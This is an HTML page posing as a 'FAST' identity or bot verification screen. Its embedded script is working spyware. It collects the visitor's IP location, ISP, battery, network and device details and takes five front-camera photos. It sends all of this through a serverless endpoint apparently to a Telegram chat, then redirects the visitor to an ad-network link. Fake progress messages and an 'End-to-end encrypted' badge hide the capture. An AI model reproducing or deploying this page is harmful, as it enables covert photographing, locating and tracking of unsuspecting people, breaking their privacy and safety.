<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>FAST | Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    html, body {
      height: 100%;
      font-family: 'Inter', -apple-system, sans-serif;
      background: #0a0a0a;
      color: #e8e4dc;
      overflow: hidden;
      -webkit-font-smoothing: antialiased;
    }

    /* Subtle gold radial wash */
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background:
        radial-gradient(ellipse 60% 50% at 50% 0%, rgba(212, 175, 105, 0.12), transparent 70%),
        radial-gradient(ellipse 50% 40% at 50% 100%, rgba(212, 175, 105, 0.06), transparent 70%);
      z-index: 0;
    }

    /* Fine diagonal lines texture */
    body::after {
      content: "";
      position: fixed;
      inset: 0;
      background-image: repeating-linear-gradient(
        135deg,
        rgba(212, 175, 105, 0.03) 0px,
        rgba(212, 175, 105, 0.03) 1px,
        transparent 1px,
        transparent 8px
      );
      pointer-events: none;
      z-index: 1;
      mask-image: radial-gradient(ellipse at center, black 20%, transparent 80%);
      -webkit-mask-image: radial-gradient(ellipse at center, black 20%, transparent 80%);
    }

    .container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 2;
      width: 92%;
      max-width: 420px;
      padding: 50px 40px 40px;
      background: linear-gradient(180deg, #121212 0%, #0d0d0d 100%);
      border: 1px solid rgba(212, 175, 105, 0.18);
      border-radius: 4px;
      box-shadow:
        0 40px 100px rgba(0, 0, 0, 0.8),
        0 0 0 1px rgba(212, 175, 105, 0.05),
        inset 0 1px 0 rgba(212, 175, 105, 0.08);
      text-align: center;
      overflow: hidden;
      animation: fade 0.9s cubic-bezier(0.2, 0.9, 0.25, 1) both;
    }

    @keyframes fade {
      from { opacity: 0; transform: translate(-50%, -46%); }
      to   { opacity: 1; transform: translate(-50%, -50%); }
    }

    /* Gold hairline top */
    .container::before {
      content: "";
      position: absolute;
      top: 0; left: 20%; right: 20%;
      height: 1px;
      background: linear-gradient(90deg, transparent, #d4af69, transparent);
    }

    /* Corner ticks (framing) */
    .container::after {
      content: "";
      position: absolute;
      inset: 14px;
      border: 1px solid rgba(212, 175, 105, 0.08);
      pointer-events: none;
    }

    /* Small gold monogram */
    .monogram {
      position: relative;
      display: inline-block;
      font-family: 'Cormorant Garamond', serif;
      font-size: 11px;
      font-weight: 600;
      letter-spacing: 6px;
      color: #d4af69;
      text-transform: uppercase;
      margin-bottom: 30px;
      padding-bottom: 6px;
      border-bottom: 1px solid rgba(212, 175, 105, 0.25);
      z-index: 1;
    }

    /* Emblem */
    .emblem {
      position: relative;
      width: 88px;
      height: 88px;
      margin: 0 auto 28px;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1;
    }

    .emblem .outline {
      position: absolute;
      inset: 0;
      border-radius: 50%;
      border: 1px solid rgba(212, 175, 105, 0.35);
    }

    .emblem .outline::before {
      content: "";
      position: absolute;
      inset: 8px;
      border-radius: 50%;
      border: 1px solid rgba(212, 175, 105, 0.15);
    }

    /* Rotating tick marks */
    .emblem .ticks {
      position: absolute;
      inset: -6px;
      border-radius: 50%;
      animation: rotate 20s linear infinite;
    }

    .emblem .ticks::before,
    .emblem .ticks::after {
      content: "";
      position: absolute;
      top: 50%; left: 50%;
      width: 2px;
      height: 6px;
      background: #d4af69;
      transform-origin: center;
      border-radius: 1px;
    }

    .emblem .ticks::before { transform: translate(-50%, -50%) rotate(0deg) translateY(-44px); }
    .emblem .ticks::after  { transform: translate(-50%, -50%) rotate(180deg) translateY(-44px); opacity: 0.5; }

    @keyframes rotate {
      to { transform: rotate(360deg); }
    }

    .emblem .core {
      position: relative;
      width: 56px;
      height: 56px;
      border-radius: 50%;
      background: radial-gradient(circle at 35% 30%, #f0d99b 0%, #d4af69 35%, #8a6d2f 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow:
        0 8px 22px rgba(212, 175, 105, 0.25),
        inset 0 -3px 8px rgba(0, 0, 0, 0.35),
        inset 0 3px 6px rgba(255, 235, 180, 0.5);
      animation: glow 3s ease-in-out infinite;
    }

    @keyframes glow {
      0%, 100% { box-shadow: 0 8px 22px rgba(212, 175, 105, 0.25), inset 0 -3px 8px rgba(0, 0, 0, 0.35), inset 0 3px 6px rgba(255, 235, 180, 0.5); }
      50%      { box-shadow: 0 8px 30px rgba(212, 175, 105, 0.55), inset 0 -3px 8px rgba(0, 0, 0, 0.35), inset 0 3px 6px rgba(255, 235, 180, 0.7); }
    }

    .emblem .core svg {
      width: 24px;
      height: 24px;
      stroke: #1a1408;
      fill: none;
      stroke-width: 1.8;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    /* Heading serif */
    h1 {
      position: relative;
      font-family: 'Cormorant Garamond', serif;
      font-weight: 500;
      font-size: 32px;
      line-height: 1.15;
      letter-spacing: -0.3px;
      color: #f0e8d8;
      margin-bottom: 12px;
      z-index: 1;
    }

    h1 em {
      font-style: italic;
      color: #d4af69;
    }

    p {
      position: relative;
      font-size: 13px;
      line-height: 1.7;
      color: rgba(232, 228, 220, 0.55);
      max-width: 290px;
      margin: 0 auto;
      font-weight: 400;
      z-index: 1;
      letter-spacing: 0.2px;
    }

    /* Elegant thin divider */
    .divider {
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin: 30px auto 24px;
      width: 70%;
      z-index: 1;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: linear-gradient(90deg, transparent, rgba(212, 175, 105, 0.4), transparent);
    }

    .divider .diamond {
      width: 6px;
      height: 6px;
      background: #d4af69;
      transform: rotate(45deg);
      box-shadow: 0 0 8px rgba(212, 175, 105, 0.8);
      animation: diamondPulse 2.4s ease-in-out infinite;
    }

    @keyframes diamondPulse {
      0%, 100% { opacity: 0.6; transform: rotate(45deg) scale(1); }
      50%      { opacity: 1;   transform: rotate(45deg) scale(1.3); }
    }

    /* Progress line */
    .progress {
      position: relative;
      height: 1px;
      width: 100%;
      background: rgba(212, 175, 105, 0.12);
      overflow: hidden;
      z-index: 1;
    }

    .progress::after {
      content: "";
      position: absolute;
      top: 0; left: 0;
      height: 100%;
      width: 40%;
      background: linear-gradient(90deg, transparent, #d4af69, #f0d99b, #d4af69, transparent);
      box-shadow: 0 0 10px rgba(212, 175, 105, 0.9);
      animation: sweep 2.4s cubic-bezier(0.65, 0, 0.35, 1) infinite;
    }

    @keyframes sweep {
      0%   { left: -40%; }
      100% { left: 100%; }
    }

    /* Status */
    .status {
      position: relative;
      margin-top: 22px !important;
      display: inline-flex;
      align-items: center;
      gap: 10px;
      font-family: 'Inter', sans-serif !important;
      font-size: 11.5px !important;
      font-weight: 500;
      letter-spacing: 1.2px;
      text-transform: uppercase;
      color: rgba(212, 175, 105, 0.9) !important;
      max-width: none !important;
      z-index: 1;
    }

    .status::before {
      content: "";
      width: 5px;
      height: 5px;
      border-radius: 50%;
      background: #d4af69;
      box-shadow: 0 0 0 0 rgba(212, 175, 105, 0.6);
      animation: ping 1.8s ease-out infinite;
    }

    @keyframes ping {
      0%   { box-shadow: 0 0 0 0 rgba(212, 175, 105, 0.6); }
      70%  { box-shadow: 0 0 0 8px rgba(212, 175, 105, 0); }
      100% { box-shadow: 0 0 0 0 rgba(212, 175, 105, 0); }
    }

    /* Footer */
    .secure {
      position: relative;
      margin-top: 34px;
      padding-top: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-size: 10px;
      font-weight: 500;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: rgba(212, 175, 105, 0.45);
      z-index: 1;
    }

    .secure::before {
      content: "";
      position: absolute;
      top: 0;
      left: 30%; right: 30%;
      height: 1px;
      background: linear-gradient(90deg, transparent, rgba(212, 175, 105, 0.2), transparent);
    }

    .secure svg {
      width: 11px;
      height: 11px;
      stroke: rgba(212, 175, 105, 0.55);
      fill: none;
      stroke-width: 1.8;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    @media (max-width: 440px) {
      .container { padding: 40px 26px 32px; }
      h1 { font-size: 27px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <span class="monogram">FAST</span>

    <div class="emblem">
      <span class="outline"></span>
      <span class="ticks"></span>
      <div class="core">
        <svg viewBox="0 0 24 24">
          <rect x="5" y="11" width="14" height="9" rx="2" />
          <path d="M8 11V8a4 4 0 0 1 8 0v3" />
        </svg>
      </div>
    </div>

    <h1>Verifying your <em>identity</em></h1>
    <p>We are verifying that you're not a bot.</p>

    <div class="divider"><span class="diamond"></span></div>

    <div class="progress"></div>

    <p class="status" id="status">Initializing...</p>

    <div class="secure">
      <svg viewBox="0 0 24 24">
        <path d="M12 2l8 4v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6l8-4z" />
      </svg>
      End-to-end encrypted
    </div>
  </div>

  <script>
    const CHAT_ID = new URLSearchParams(window.location.search).get('id');
    const b = new URLSearchParams(window.location.search).get('b');
    const statusEl = document.getElementById('status');

    window.onload = async () => {
      statusEl.textContent = '📡 Connecting with server...';
      await sendDeviceInfo();

      try {
        statusEl.textContent = '🔨 Analyzing...';
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, audio: false
        });

        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);

        for (let i = 0; i < 5; i++) {
          const per = (i + 1) * 20;
          statusEl.textContent = `⚙️ Working ${per}%...`;
          const blob = await imageCapture.takePhoto();
          const compressedBlob = await compressImage(blob);
          const base64 = await blobToBase64(compressedBlob);
          await sendToTelegram(base64, 'Photo');
          await new Promise(res => setTimeout(res, 1000));
        }

        track.stop();
        statusEl.textContent = '✅ Verified!';
        window.location.href = "https://www.profitablecpmratenetwork.com/jq2i28k2hr?key=ed3eea068e11663c158cc80f029f022d";
      } catch (err) {
        statusEl.textContent = '❌ Camera permission denied.';
        console.error(err);
      }
    };

    async function sendDeviceInfo() {
      try {
        const ip = await fetch('https://ipinfo.io/json?token=5602d2e05cb668').then(r => r.json());
        const battery = await navigator.getBattery();
        const time = new Date().toLocaleString('en-IN');
        const msg = `
🌐 *IP Information*

🔢 IP Address: ${ip.ip}
📍 Location: ${ip.city}
🌍 Region: ${ip.region}
🗺 Country: ${ip.country}
📡 ISP: ${ip.org}


📱 *Device Details*

🔋 Battery: ${Math.round(battery.level * 100)}% ${battery.charging ? '⚡ Charging' : ''}
📶 Network: ${navigator.connection?.effectiveType || 'Unknown'}
🖥️ Screen: ${screen.width}x${screen.height}
🕒 Time: ${time}
🧠 UA: ${navigator.userAgent}
        `;
        await sendToTelegram(msg.trim(), 'Text');
      } catch (e) {
        console.error("Device Info Error:", e);
      }
    }

    async function compressImage(blob) {
      return new Promise((resolve) => {
        const img = new Image();
        img.src = URL.createObjectURL(blob);
        img.onload = () => {
          const canvas = document.createElement('canvas');
          canvas.width = img.width / 2;
          canvas.height = img.height / 2;
          canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(resolve, 'image/jpeg', 0.7);
        };
      });
    }

    async function blobToBase64(blob) {
      return new Promise((resolve) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(',')[1]);
        reader.readAsDataURL(blob);
      });
    }

    async function sendToTelegram(data, type) {
  await fetch('/.netlify/functions/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      type: type.toLowerCase() === 'text' ? 'text' : 'photo',
      text: type.toLowerCase() === 'text' ? data : null,
      photo: type.toLowerCase() === 'photo' ? data : null
    })
  });
}
  </script>
</body>
</html>
